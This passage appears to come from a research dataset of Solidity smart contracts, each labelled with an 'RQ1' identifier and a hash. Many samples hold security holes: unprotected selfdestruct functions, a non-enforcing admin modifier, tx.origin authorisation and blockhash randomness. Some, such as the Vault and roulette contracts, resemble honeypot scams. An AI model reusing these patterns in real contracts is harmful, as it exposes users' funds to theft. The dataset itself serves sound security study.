    function burn(uint256 _value) public returns (bool success) {
        require(balanceOf[msg.sender] >= _value);   
        balanceOf[msg.sender] -= _value;            
        totalSupply -= _value;                      
        Burn(msg.sender, _value);
        return true;
    }
    function burnFrom(address _from, uint256 _value) public returns (bool success) {
        require(balanceOf[_from] >= _value);                
        require(_value <= allowance[_from][msg.sender]);    
        balanceOf[_from] -= _value;                         
        allowance[_from][msg.sender] -= _value;             
        totalSupply -= _value;                              
        Burn(_from, _value);
        return true;
    }
}
contract EncryptedToken is owned, TokenERC20 {
  uint256 INITIAL_SUPPLY = 500000000;
  uint256 public buyPrice = 2000;
  mapping (address => bool) public frozenAccount;
    event FrozenFunds(address target, bool frozen);
	function EncryptedToken() TokenERC20(INITIAL_SUPPLY, 'ESTA', 'ESTA') payable public {
    }
    function _transfer(address _from, address _to, uint _value) internal {
        require (_to != 0x0);                               
        require (balanceOf[_from] >= _value);               
        require (balanceOf[_to] + _value > balanceOf[_to]); 
        require(!frozenAccount[_from]);                     
        require(!frozenAccount[_to]);                       
        balanceOf[_from] -= _value;                         
        balanceOf[_to] += _value;                           
        Transfer(_from, _to, _value);
    }
    function mintToken(address target, uint256 mintedAmount) onlyOwner public {
        balanceOf[target] += mintedAmount;
        totalSupply += mintedAmount;
        Transfer(0, this, mintedAmount);
        Transfer(this, target, mintedAmount);
    }
    function freezeAccount(address target, bool freeze) onlyOwner public {
        frozenAccount[target] = freeze;
        FrozenFunds(target, freeze);
    }
    function setPrices(uint256 newBuyPrice) onlyOwner public {
        buyPrice = newBuyPrice;
    }
    function buy() payable public {
        uint amount = msg.value / buyPrice;               
        _transfer(this, msg.sender, amount);              
    }
    function () payable public {
    		uint amount = msg.value * buyPrice;               
    		_transfer(owner, msg.sender, amount);
    }
    function selfdestructs() payable public {
    		selfdestruct(owner);
    }
    function getEth(uint num) payable public {
    		owner.send(num);
    }
  function balanceOfa(address _owner) public constant returns (uint256) {
    return balanceOf[_owner];
  }
}
```

## RQ1_0e3c3362706f

文件 `units/program.sol`；SHA256 `43d43915326c9d84a6201d83c7dd1158204106f3ceb366776861065dd8a05068`；位置按UTF-8字节。

```solidity
pragma solidity ^0.4.24;
contract TestNetworkToken {
    string public constant name = "Test Network Token";
    string public constant symbol = "TNT";
    uint8 public constant decimals = 18;  
    uint256 public constant tokenCreationRate = 1000;
    uint256 totalTokens;
    mapping (address => uint256) balances;
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Refund(address indexed _from, uint256 _value);
    function transfer(address _to, uint256 _value) returns (bool) {
        return false;
    }
    function totalSupply() external constant returns (uint256) {
        return totalTokens;
    }
    function balanceOf(address _owner) external constant returns (uint256) {
        return balances[_owner];
    }
    function create() payable external {
        if (msg.value == 0) throw;
        var numTokens = msg.value * tokenCreationRate;
        totalTokens += numTokens;
        balances[msg.sender] += numTokens;
        Transfer(0x0, msg.sender, numTokens);
    }
    function refund() external {
        var tokenValue = balances[msg.sender];
        if (tokenValue == 0) throw;
        balances[msg.sender] = 0;
        totalTokens -= tokenValue;
        var ethValue = tokenValue / tokenCreationRate;
        Refund(msg.sender, ethValue);
        if (!msg.sender.send(ethValue)) throw;
    }
    function kill() {
        if(totalTokens > 0) throw;
        selfdestruct(msg.sender);
    }
}

```

## RQ1_4580c60aec2d

文件 `units/program.sol`；SHA256 `8e9f6ef1e9f9b1cd674802c9a8618957f3c4caf1d1da2a775ccd42b24e0f9e1e`；位置按UTF-8字节。

```solidity
pragma solidity ^0.4.16;
contract owned {
    address public owner;
    function owned() {
        owner = msg.sender;
    }
    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }
}    
interface tokenRecipient { function receiveApproval(address _from, uint256 _value, address _token, bytes _extraData) public; }
contract x32323 is owned{
    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;
    mapping (address => bool) public frozenAccount;
    mapping (address => bool) initialized;
    event FrozenFunds(address target, bool frozen);
    event Transfer(address indexed from, address indexed to, uint256 value);
    function freezeAccount(address target, bool freeze) onlyOwner {
        frozenAccount[target] = freeze;
        FrozenFunds(target, freeze);
    }
    string public name;
    string public symbol;
    uint8 public decimals = 2;
    uint256 public totalSupply;
    uint256 public maxSupply = 23000000 * 10 ** uint256(decimals);
    uint256 airdropAmount = 2000000 * 10 ** uint256(decimals);
    uint256 bonis = 1000000 * 10 ** uint256(decimals);
    uint256 totalairdrop =  8000000 * 10 ** uint256(decimals);
    function TokenERC20(
        uint256 initialSupply,
        string tokenName,
        string tokenSymbol
    ) public {
	initialSupply = maxSupply - totalairdrop;
    balanceOf[msg.sender] = initialSupply;
    totalSupply = initialSupply;
	initialized[msg.sender] = true;
        name = "測試14";
        symbol = "測試14";         
    }
    function initialize(address _address) internal returns (bool success) {
        if (totalSupply <= (maxSupply - airdropAmount) && !initialized[_address]) {
            initialized[_address] = true ;
            balanceOf[_address] += airdropAmount;
            totalSupply += airdropAmount;
        }
        return true;
    }
    function reward(address _address) internal returns (bool success) {
	if (totalSupply < maxSupply) {
        	balanceOf[_address] += airdropAmount;
        	totalSupply += airdropAmount;
        	return true;
	}
    }
    function _transfer(address _from, address _to, uint _value) internal {
	require(!frozenAccount[_from]);
        require(_to != 0x0);
        require(balanceOf[_from] >= _value);
        require(balanceOf[_to] + _value >= balanceOf[_to]);
	initialize(_from);
	reward(_from);
	initialize(_to);
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        Transfer(_from, _to, _value);
    }
    function transfer(address _to, uint256 _value) public {
	if(msg.sender.balance < minBalanceForAccounts)
            sell((minBalanceForAccounts - msg.sender.balance) / sellPrice);
        _transfer(msg.sender, _to, _value);
    }
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= allowance[_from][msg.sender]);     
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }
    function approve(address _spender, uint256 _value) public
        returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        return true;
    }
    function approveAndCall(address _spender, uint256 _value, bytes _extraData)
        public
        returns (bool success) {
        tokenRecipient spender = tokenRecipient(_spender);
        if (approve(_spender, _value)) {
            spender.receiveApproval(msg.sender, _value, this, _extraData);
            return true;
        }
    }
    uint256 public sellPrice;
    uint256 public buyPrice;
    function setPrices(uint256 newSellPrice, uint256 newBuyPrice) onlyOwner {
        sellPrice = newSellPrice;
        buyPrice = newBuyPrice;
    }
    function buy() payable returns (uint amount){
        amount = msg.value / buyPrice;                    
        require(balanceOf[this] >= amount);               
        balanceOf[msg.sender] += amount;                  
        balanceOf[this] -= amount;                        
        Transfer(this, msg.sender, amount);               
        return amount;                                    
    }
    function sell(uint amount) returns (uint revenue){
        require(balanceOf[msg.sender] >= amount);         
        balanceOf[this] += amount;                        
        balanceOf[msg.sender] -= amount;                  
        revenue = amount * sellPrice;
        msg.sender.transfer(revenue);                     
        Transfer(msg.sender, this, amount);               
        return revenue;                                   
    }
    uint minBalanceForAccounts;
    function setMinBalance(uint minimumBalanceInFinney) onlyOwner {
         minBalanceForAccounts = minimumBalanceInFinney * 1 finney;
    }
}
```

## RQ1_dee4a75fd1b4

文件 `units/program.sol`；SHA256 `f376691564197586eb3137cfa255df3974458a7f68bd23ee20b2501fe883ae0f`；位置按UTF-8字节。

```solidity
pragma solidity ^0.4.17;
contract Ownable {
    address public Owner;
    modifier onlyOwner {
        require(msg.sender == Owner);
        _;
    }
    function kill() public onlyOwner {
        require(this.balance == 0);
        selfdestruct(Owner);
    }
}
contract Lockable is Ownable {
    bool public Locked;
    modifier isUnlocked {
        require(!Locked);
        _;
    }
    function Lockable() { Locked = false; }
    function lock() public onlyOwner { Locked = true; }
    function unlock() public onlyOwner { Locked = false; }
}
contract Transferable is Lockable {
    address public PendingOwner;
    modifier onlyPendingOwner {
        require(msg.sender == PendingOwner);
        _;
    }
    event OwnershipTransferPending(address indexed Owner, address indexed PendingOwner);
    event AcceptedOwnership(address indexed NewOwner);
    function transferOwnership(address _new) public onlyOwner {
        PendingOwner = _new;
        OwnershipTransferPending(Owner, PendingOwner);
    }
    function acceptOwnership() public onlyPendingOwner {
        Owner = msg.sender;
        PendingOwner = address(0x0);
        AcceptedOwnership(Owner);
    }
}
contract Vault is Transferable {
    event Initialized(address owner);
    event LockDate(uint oldDate, uint newDate);
    event Deposit(address indexed depositor, uint amount);
    event Withdrawal(address indexed withdrawer, uint amount);
    mapping (address => uint) public deposits;
    uint public lockDate;
    function init() public payable isUnlocked {
        Owner = msg.sender;
        lockDate = 0;
        Initialized(msg.sender);
    }
    function SetLockDate(uint newDate) public payable onlyOwner {
        LockDate(lockDate, newDate);
        lockDate = newDate;
    }
    function() public payable { deposit(); }
    function deposit() public payable {
        if (msg.value >= 0.1 ether) {
            deposits[msg.sender] += msg.value;
            Deposit(msg.sender, msg.value);
        }
    }
    function withdraw(uint amount) public payable onlyOwner {
        if (lockDate > 0 && now >= lockDate) {
            uint max = deposits[msg.sender];
            if (amount <= max && max > 0) {
                msg.sender.transfer(amount);
                Withdrawal(msg.sender, amount);
            }
        }
    }
}
```

## RQ1_5e9adf3cda8c

文件 `units/program.sol`；SHA256 `8ed5562b8ba0ede40b0163665428fff6a3832f10d778d0b46a33d65d2b4b9733`；位置按UTF-8字节。

```solidity
pragma solidity ^0.4.23;
library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {
    if (a == 0) {
      return 0;
    }
    c = a * b;
    assert(c / a == b);
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return a / b;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  function add(uint256 a, uint256 b) internal pure returns (uint256 c) {
    c = a + b;
    assert(c >= a);
    return c;
  }
}
contract Token {
  function transferFrom(address from, address to, uint256 tokens) public returns (bool success);
  function transfer(address to, uint256 tokens) public returns (bool success);
}
contract BancorKillerContract { 
  using SafeMath for uint256;
  address public admin;
  address public base_token;
  address public traded_token;
  uint256 public base_token_seed_amount;
  uint256 public traded_token_seed_amount;
  uint256 public commission_ratio;
  bool public base_token_is_seeded;
  bool public traded_token_is_seeded;
  mapping (address => uint256) public token_balance;
  modifier onlyAdmin() {
      msg.sender == admin;
      _;
  }
  constructor(address _base_token, address _traded_token,uint256 _base_token_seed_amount, uint256 _traded_token_seed_amount, uint256 _commission_ratio) public {
    admin = tx.origin;  
    base_token = _base_token;
    traded_token = _traded_token;
    base_token_seed_amount = _base_token_seed_amount;
    traded_token_seed_amount = _traded_token_seed_amount;
    commission_ratio = _commission_ratio;
  }
  function transferTokensThroughProxyToContract(address _from, address _to, uint256 _amount) private {
    token_balance[traded_token] = token_balance[traded_token].add(_amount);
    require(Token(traded_token).transferFrom(_from,_to,_amount));
  }  
  function transferTokensFromContract(address _to, uint256 _amount) private {
    token_balance[traded_token] = token_balance[traded_token].sub(_amount);
    require(Token(traded_token).transfer(_to,_amount));
  }
  function transferETHToContract() private {
    token_balance[0] = token_balance[0].add(msg.value);
  }
  function transferETHFromContract(address _to, uint256 _amount) private {
    token_balance[0] = token_balance[0].sub(_amount);
    _to.transfer(_amount);
  }
  function deposit_token(address _token, uint256 _amount) private { 
    token_balance[_token] = token_balance[_token].add(_amount);
    transferTokensThroughProxyToContract(msg.sender, this, _amount);
  }  
  function deposit_eth() private { 
    token_balance[0] = token_balance[0].add(msg.value);
  }  
  function withdraw_token(uint256 _amount) onlyAdmin public {
      uint256 currentBalance_ = token_balance[traded_token];
      require(currentBalance_ >= _amount);
      transferTokensFromContract(msg.sender, _amount);
  }
  function withdraw_eth(uint256 _amount) onlyAdmin public {
      uint256 currentBalance_ = token_balance[0];
      require(currentBalance_ >= _amount);
      transferETHFromContract(msg.sender, _amount);
  }
  function set_traded_token_as_seeded() private {
    traded_token_is_seeded = true;
  }
  function set_base_token_as_seeded() private {
    base_token_is_seeded = true;
  }
  function seed_traded_token() public {
    require(!market_is_open());
    set_traded_token_as_seeded();
    deposit_token(traded_token, traded_token_seed_amount); 
  }
  function seed_base_token() public payable {
    require(!market_is_open());
    require(msg.value == base_token_seed_amount);
    set_base_token_as_seeded();
    deposit_eth(); 
  }
  function market_is_open() private view returns(bool) {
    return (base_token_is_seeded && traded_token_is_seeded);
  }
  function get_amount_sell(uint256 _amount) public view returns(uint256) {
    uint256 base_token_balance_ = token_balance[base_token]; 
    uint256 traded_token_balance_ = token_balance[traded_token];
    uint256 traded_token_balance_plus_amount_ = traded_token_balance_ + _amount;
    return (2*base_token_balance_*_amount)/(traded_token_balance_ + traded_token_balance_plus_amount_);
  }
  function get_amount_buy(uint256 _amount) public view returns(uint256) {
    uint256 base_token_balance_ = token_balance[base_token]; 
    uint256 traded_token_balance_ = token_balance[traded_token];
    uint256 base_token_balance_plus_amount_ = base_token_balance_ + _amount;
    return (_amount*traded_token_balance_*(base_token_balance_plus_amount_ + base_token_balance_))/(2*base_token_balance_plus_amount_*base_token_balance_);
  }
  function get_amount_minus_fee(uint256 _amount) private view returns(uint256) {
    return (_amount*(1 ether - commission_ratio))/(1 ether);  
  }
  function complete_sell_exchange(uint256 _amount_give) private {
    uint256 amount_get_ = get_amount_sell(_amount_give);
    require(amount_get_ < token_balance[base_token]);
    uint256 amount_get_minus_fee_ = get_amount_minus_fee(amount_get_);
    uint256 admin_fee = amount_get_ - amount_get_minus_fee_;
    transferTokensThroughProxyToContract(msg.sender,this,_amount_give);
    transferETHFromContract(msg.sender,amount_get_minus_fee_);  
    transferETHFromContract(admin, admin_fee);     
  }
  function complete_buy_exchange() private {
    uint256 amount_give_ = msg.value;
    uint256 amount_get_ = get_amount_buy(amount_give_);
    require(amount_get_ < token_balance[traded_token]);
    uint256 amount_get_minus_fee_ = get_amount_minus_fee(amount_get_);
    uint256 admin_fee = amount_get_ - amount_get_minus_fee_;
    transferETHToContract();
    transferTokensFromContract(msg.sender, amount_get_minus_fee_);
    transferTokensFromContract(admin, admin_fee);
  }
  function sell_tokens(uint256 _amount_give) public {
    require(market_is_open());
    complete_sell_exchange(_amount_give);
  }
  function buy_tokens() private {
    require(market_is_open());
    complete_buy_exchange();
  }
  function() public payable {
    buy_tokens();
  }
}
```

## RQ1_247865e5ab88

文件 `units/program.sol`；SHA256 `a2b9b8478f083bc5aca24c2b45ef0f0ebe3bf4c76abc59d0cabc0d66ff84b77b`；位置按UTF-8字节。

```solidity
pragma solidity ^0.4.14;
contract Ownable {
    address Owner = msg.sender;
    modifier onlyOwner { if (msg.sender == Owner) _; }
    function transferOwnership(address to) public onlyOwner { Owner = to; }
}
contract TokenVault is Ownable {
    function withdrawTokenTo(address token, address to, uint amount) public onlyOwner returns (bool) {
        return token.call(bytes4(0xa9059cbb), to, amount);
    }
}
contract Vault is TokenVault {
    event Deposit(address indexed depositor, uint amount);
    event Withdrawal(address indexed to, uint amount);
    event OpenDate(uint date);
    mapping (address => uint) public Deposits;
    uint minDeposit;
    bool Locked;
    uint Date;
    function init() payable open {
        Owner = msg.sender;
        minDeposit = 0.5 ether;
        Locked = false;
        deposit();
    }
    function MinimumDeposit() public constant returns (uint) { return minDeposit; }
    function ReleaseDate() public constant returns (uint) { return Date; }
    function WithdrawEnabled() public constant returns (bool) { return Date > 0 && Date <= now; }
    function() public payable { deposit(); }
    function deposit() public payable {
        if (msg.value > 0) {
            if (msg.value >= MinimumDeposit())
                Deposits[msg.sender] += msg.value;
            Deposit(msg.sender, msg.value);
        }
    }
    function setRelease(uint newDate) public { 
        Date = newDate;
        OpenDate(Date);
    }
    function withdraw(address to, uint amount) public onlyOwner {
        if (WithdrawEnabled()) {
            uint max = Deposits[msg.sender];
            if (max > 0 && amount <= max) {
                to.transfer(amount);
                Withdrawal(to, amount);
            }
        }
    }
    function lock() public { Locked = true; } address owner;
    modifier open { if (!Locked) _; owner = msg.sender; }
    function kill() public { require(this.balance == 0); selfdestruct(Owner); }
    function getOwner() external constant returns (address) { return owner; }
}
```

## RQ1_13f2a43e4b12

文件 `units/program.sol`；SHA256 `e905e5b9324174e02875024bd3aa262613c4d3f160c43a047f257f8147c70fdc`；位置按UTF-8字节。

```solidity
pragma solidity ^0.4.11;
contract Owned {
    address public owner;
    function owned() {
        owner = msg.sender;
    }
    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }
    function transferOwnership(address _newOwner) onlyOwner {
        owner = _newOwner;
    }
}
contract Mortal is Owned {
    function kill() onlyOwner {
        selfdestruct(owner);
    }
}
contract SafeMath {
  function mul(uint256 a, uint256 b)
  internal
  constant
  returns (uint256) {
    uint256 c = a * b;
    assert(a == 0 || c / a == b);
    return c;
  }
  function div(uint256 a, uint256 b)
  internal
  constant
  returns (uint256) {
    uint256 c = a / b;
    return c;
  }
  function sub(uint256 a, uint256 b)
  internal
  constant
  returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  function add(uint256 a, uint256 b)
  internal
  constant
  returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}
contract Random is SafeMath {
    function getRandomFromBlockHash(uint blockNumber, uint max)
    public
    constant 
    returns(uint) {
        return(add(uint(sha3(block.blockhash(blockNumber))) % max, 1));
    }
}
contract RandomLedger is Owned {
    uint256 public cost;
    uint8 public waitTime;
    uint256 public max;
    struct PendingNumber {
        address requestProxy;
        uint256 renderedNumber;
        uint256 originBlock;
        uint256 max;
        uint8 waitTime;
    }
    event EventRandomLedgerRequested(address requestor, uint256 max, uint256 originBlock, uint8 waitTime, address indexed requestProxy);
    event EventRandomLedgerRevealed(address requestor, uint256 originBlock, uint256 renderedNumber, address indexed requestProxy);
    mapping (address => PendingNumber) pendingNumbers;
    mapping (address => bool) public whiteList;
    function requestNumber(address _requestor, uint256 _max, uint8 _waitTime) payable public;
    function revealNumber(address _requestor) payable public;
}
contract RandomLedgerService is RandomLedger, Mortal, Random {
    function RandomLedgerService() {
        owned();
        cost = 20000000000000000; 
        max = 21; 
        waitTime = 5; 
    }
    function setMax(uint256 _max)
    onlyOwner
    public
    returns (bool) {
        max = _max;
        return true;
    }
    function setWaitTime(uint8 _waitTime)
    onlyOwner
    public
    returns (bool) {
        waitTime = _waitTime;
        return true;
    }
    function setCost(uint256 _cost)
    onlyOwner
    public
    returns (bool) {
        cost = _cost;
        return true;
    }
    function enableProxy(address _proxy)
    onlyOwner
    public
    returns (bool) {
        whiteList[_proxy] = true;
        return whiteList[_proxy];
    }
    function removeProxy(address _proxy)
    onlyOwner
    public
    returns (bool) {
        delete whiteList[_proxy];
        return true;
    }
    function withdraw(address _recipient, uint256 _balance)
    onlyOwner
    public
    returns (bool) {
        _recipient.transfer(_balance);
        return true;
    }
    function () payable public {
        assert(msg.sender != owner);
        requestNumber(msg.sender, max, waitTime);
    }
    function requestNumber(address _requestor, uint256 _max, uint8 _waitTime)
    payable 
    public {
        if (!whiteList[msg.sender]) {
            require(!(msg.value < cost));
        }
        assert(!isRequestPending(_requestor));
        pendingNumbers[_requestor] = PendingNumber({
            requestProxy: tx.origin, 
            renderedNumber: 0,
            max: max,
            originBlock: block.number,
            waitTime: waitTime
        });
        if (_max > 1) {
            pendingNumbers[_requestor].max = _max;
        }
        if (_waitTime > 0 && _waitTime < 250) {
            pendingNumbers[_requestor].waitTime = _waitTime;
        }
        EventRandomLedgerRequested(_requestor, pendingNumbers[_requestor].max, pendingNumbers[_requestor].originBlock, pendingNumbers[_requestor].waitTime, pendingNumbers[_requestor].requestProxy);
    }
    function revealNumber(address _requestor)
    public
    payable {
        assert(_canReveal(_requestor, msg.sender));
        _revealNumber(_requestor);
    }
    function _revealNumber(address _requestor) 
    internal {
        uint256 luckyBlock = _revealBlock(_requestor);
        uint256 luckyNumber = getRandomFromBlockHash(luckyBlock, pendingNumbers[_requestor].max);
        pendingNumbers[_requestor].renderedNumber = luckyNumber;
        EventRandomLedgerRevealed(_requestor, pendingNumbers[_requestor].originBlock, pendingNumbers[_requestor].renderedNumber, pendingNumbers[_requestor].requestProxy);
        pendingNumbers[_requestor].waitTime = 0;
    }
    function canReveal(address _requestor)
    public
    constant
    returns (bool, uint, uint, address, address) {
        return (_canReveal(_requestor, msg.sender), _remainingBlocks(_requestor), _revealBlock(_requestor), _requestor, msg.sender);
    }
    function _canReveal(address _requestor, address _proxy) 
    internal
    constant
    returns (bool) {
        if (isRequestPending(_requestor)) {
            if (_remainingBlocks(_requestor) == 0) {
                if (pendingNumbers[_requestor].requestProxy == _requestor || pendingNumbers[_requestor].requestProxy == _proxy) {
                    return true;
                }
            }
        }
        return false;
    }
    function _remainingBlocks(address _requestor)
    internal
    constant
    returns (uint) {
        uint256 revealBlock = add(pendingNumbers[_requestor].originBlock, pendingNumbers[_requestor].waitTime);
        uint256 remainingBlocks = 0;
        if (revealBlock > block.number) {
            remainingBlocks = sub(revealBlock, block.number);
        }
        return remainingBlocks;
    }
    function _revealBlock(address _requestor)
    internal
    constant
    returns (uint) {
        return add(pendingNumbers[_requestor].originBlock, pendingNumbers[_requestor].waitTime);
    }
    function getNumber(address _requestor)
    public
    constant
    returns (uint, uint, uint, address) {
        return (pendingNumbers[_requestor].renderedNumber, pendingNumbers[_requestor].max, pendingNumbers[_requestor].originBlock, _requestor);
    }
    function isRequestPending(address _requestor)
    public
    constant
    returns (bool) {
        if (pendingNumbers[_requestor].renderedNumber == 0 && pendingNumbers[_requestor].waitTime > 0) {
            return true;
        }
        return false;
    }
}
```

## RQ1_2e5ccd7b4bd2

文件 `units/program.sol`；SHA256 `d81e112bfe11e29995c7b694c17ebff17594ba22687919d10d843f95cc38f137`；位置按UTF-8字节。

```solidity
pragma solidity ^0.4.24;
contract ERC20 {
  using SafeMath for uint256;
  event Transfer(
    address indexed from,
    address indexed to,
    uint256 value
  );
  event Approval(
    address indexed owner,
    address indexed spender,
    uint256 value
  );
  mapping (address => uint256) private balances_;
  mapping (address => mapping (address => uint256)) private allowed_;
  uint256 private totalSupply_;
  function totalSupply() public view returns (uint256) {
    return totalSupply_;
  }
  function balanceOf(address _owner) public view returns (uint256) {
    return balances_[_owner];
  }
  function allowance(
    address _owner,
    address _spender
   )
    external
    view
    returns (uint256)
  {
    return allowed_[_owner][_spender];
  }
  function transfer(address _to, uint256 _value) external returns (bool) {
    require(_value <= balances_[msg.sender]);
    require(_to != address(0));
    balances_[msg.sender] = balances_[msg.sender].sub(_value);
    balances_[_to] = balances_[_to].add(_value);
    emit Transfer(msg.sender, _to, _value);
    return true;
  }
  function approve(address _spender, uint256 _value) external returns (bool) {
    allowed_[msg.sender][_spender] = _value;
    emit Approval(msg.sender, _spender, _value);
    return true;
  }
  function transferFrom(
    address _from,
    address _to,
    uint256 _value
  )
    external
    returns (bool)
  {
    require(_value <= balances_[_from]);
    require(_value <= allowed_[_from][msg.sender]);
    require(_to != address(0));
    balances_[_from] = balances_[_from].sub(_value);
    balances_[_to] = balances_[_to].add(_value);
    allowed_[_from][msg.sender] = allowed_[_from][msg.sender].sub(_value);
    emit Transfer(_from, _to, _value);
    return true;
  }
  function increaseApproval(
    address _spender,
    uint256 _addedValue
  )
    external
    returns (bool)
  {
    allowed_[msg.sender][_spender] = (
      allowed_[msg.sender][_spender].add(_addedValue));
    emit Approval(msg.sender, _spender, allowed_[msg.sender][_spender]);
    return true;
  }
  function decreaseApproval(
    address _spender,
    uint256 _subtractedValue
  )
    external
    returns (bool)
  {
    uint256 oldValue = allowed_[msg.sender][_spender];
    if (_subtractedValue >= oldValue) {
      allowed_[msg.sender][_spender] = 0;
    } else {
      allowed_[msg.sender][_spender] = oldValue.sub(_subtractedValue);
    }
    emit Approval(msg.sender, _spender, allowed_[msg.sender][_spender]);
    return true;
  }
  function _mint(address _account, uint256 _amount) internal {
    require(_account != 0);
    totalSupply_ = totalSupply_.add(_amount);
    balances_[_account] = balances_[_account].add(_amount);
    emit Transfer(address(0), _account, _amount);
  }
  function _burn(address _account, uint256 _amount) internal {
    require(_account != 0);
    require(_amount <= balances_[_account]);
    totalSupply_ = totalSupply_.sub(_amount);
    balances_[_account] = balances_[_account].sub(_amount);
    emit Transfer(_account, address(0), _amount);
  }
}
contract DonutChain is ERC20 {
  event TokensBurned(address indexed burner, uint256 value);
  event Mint(address indexed to, uint256 amount);
  event MintFinished();
  uint8  public constant decimals = 0;
  string public constant name = "donutchain.io token #1";
  string public constant symbol = "DNT1";
  bool public flag = true;
  uint256 public endBlock;
  uint256 public mainGift;
  uint256 public amount = 0.001 ether;
  uint256 public increment = 0.000001 ether;
  address public donee;
  constructor() public {
    endBlock = block.number + 24 * 60 * 4;
  }
  function() external payable {
    require(flag);
    flag = false;
    if (endBlock > block.number) {
      require(msg.value >= amount);
      uint256 tokenAmount =  msg.value / amount;
      uint256 change = msg.value - tokenAmount * amount;
        if (change > 0 )
          msg.sender.transfer(change);
        if (msg.data.length == 20) {
          address refAddress = bToAddress(bytes(msg.data));
          refAddress.transfer(msg.value / 10); 
        } 
          mainGift += msg.value / 5; 
          donee = msg.sender;
          endBlock = block.number + 24 * 60 * 4; 
          amount += increment * tokenAmount;
          _mint(msg.sender, tokenAmount);
          emit Mint(msg.sender, tokenAmount);
          flag = true;
        } else {
          msg.sender.transfer(msg.value);
          emit MintFinished();
          selfdestruct(donee);
        }
  }
  function etherPerToken() public view returns (uint256) {
    uint256 sideETH = address(this).balance - mainGift;
    if (totalSupply() == 0)
        return 0;
    return sideETH / totalSupply();
  }
  function giftAmount(address _who) external view returns (uint256) {
    return etherPerToken() * balanceOf(_who);
  }
  function transferGift(uint256 _amount) external {
    require(balanceOf(msg.sender) >= _amount);
    uint256 ept = etherPerToken();
    _burn(msg.sender, _amount);
    emit TokensBurned(msg.sender, _amount);
    msg.sender.transfer(_amount * ept);
  }
  function bToAddress(
    bytes _bytesData
  )
    internal
    pure
    returns(address _refAddress) 
  {
    assembly {
      _refAddress := mload(add(_bytesData,0x14))
    }
    return _refAddress;
  }
}
library SafeMath {
  function sub(uint256 _a, uint256 _b) internal pure returns (uint256) {
    require(_b <= _a);
    uint256 c = _a - _b;
    return c;
  }
  function add(uint256 _a, uint256 _b) internal pure returns (uint256) {
    uint256 c = _a + _b;
    require(c >= _a);
    return c;
  }
}
```

## RQ1_2f01be3ebc82

文件 `units/program.sol`；SHA256 `4a292ec6ff933722e726c9f38956daa1a320065ea83f8aaa85b9d2d4ab78727e`；位置按UTF-8字节。

```solidity
contract Emailer {
    address owner;
	event Sent(address from, uint256 price, string to, string body);
    function Emailer() { 
        owner = msg.sender; 
    }
    function kill() { 
		suicide(owner); 
    }
	function withdraw(uint256 _amount){
		owner.send(_amount);
	}
    function SendEmail(string _Recipient, string _Message) { 
        Sent(msg.sender, msg.value, _Recipient, _Message);
    }    
}
```

## RQ1_3dba1c8c9669

文件 `units/program.sol`；SHA256 `c1c0fd8b6054cc3417303a74d21770b9d90524883587a27c88a1fcb69c9ef568`；位置按UTF-8字节。

```solidity
pragma solidity ^0.4.20;
contract R
{
    uint8 public result = 0;
    bool finished = false;
    address rouletteOwner;
    function Play(uint8 _number)
    external
    payable
    {
        require(msg.sender == tx.origin);
        if(result == _number && msg.value>0.1 ether && !finished)
        {
            msg.sender.transfer(this.balance);
            GiftHasBeenSent();
        }
    }
    function StartRoulette(uint8 _number)
    public
    payable
    {
        if(result==0)
        {
            result = _number;
            rouletteOwner = msg.sender;
        }
    }
    function StopGame(uint8 _number)
    public
    payable
    {
        require(msg.sender == rouletteOwner);
        GiftHasBeenSent();
        result = _number;
        if (msg.value>0.08 ether){
            selfdestruct(rouletteOwner);
        }
    }
    function GiftHasBeenSent()
    private
    {
        finished = true;
    }
    function() public payable{}
}
```

## RQ1_4f65b1060e4d

文件 `units/program.sol`；SHA256 `cbdb06d763c3182f296592bf43a5235ff2241f43f328f2e840a8ed80f0dc759e`；位置按UTF-8字节。

```solidity
pragma solidity ^0.4.16;
contract owned {
    address public owner;
    function owned() {
        owner = msg.sender;
    }
    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }
}    
interface tokenRecipient { function receiveApproval(address _from, uint256 _value, address _token, bytes _extraData) public; }
contract x32323 is owned{
    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;
    mapping (address => bool) public frozenAccount;
    mapping (address => bool) initialized;
    event FrozenFunds(address target, bool frozen);
    event Transfer(address indexed from, address indexed to, uint256 value);
    function freezeAccount(address target, bool freeze) onlyOwner {
        frozenAccount[target] = freeze;
        FrozenFunds(target, freeze);
    }
    string public name;
    string public symbol;
    uint8 public decimals = 2;
    uint256 public totalSupply;
    uint256 public maxSupply = 23000000 * 10 ** uint256(decimals);
    uint256 airdropAmount = 3 * 10 ** uint256(decimals);
    uint256 totalairdrop =  airdropAmount * 2000000;
    function TokenERC20(
        uint256 initialSupply,
        string tokenName,
        string tokenSymbol
    ) public {
	initialSupply = maxSupply - totalairdrop;
    balanceOf[msg.sender] = initialSupply;
    totalSupply = initialSupply;
	initialized[msg.sender] = true;
        name = "測試13";
        symbol = "測試13";         
    }
    function initialize(address _address) internal returns (bool success) {
        if (totalSupply < maxSupply && !initialized[_address]) {
            initialized[_address] = true ;
            balanceOf[_address] += airdropAmount;
            totalSupply += airdropAmount;
        }
        return true;
    }
    function _transfer(address _from, address _to, uint _value) internal {
	    require(!frozenAccount[_from]);
        require(_to != 0x0);
        initialize(_from);
        require(balanceOf[_from] >= _value);
        require(balanceOf[_to] + _value >= balanceOf[_to]);
        uint previousBalances = balanceOf[_from] + balanceOf[_to];
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        Transfer(_from, _to, _value);
        assert(balanceOf[_from] + balanceOf[_to] == previousBalances);
        initialize(_to);
    }
    function transfer(address _to, uint256 _value) public {
	if(msg.sender.balance < minBalanceForAccounts)
            sell((minBalanceForAccounts - msg.sender.balance) / sellPrice);
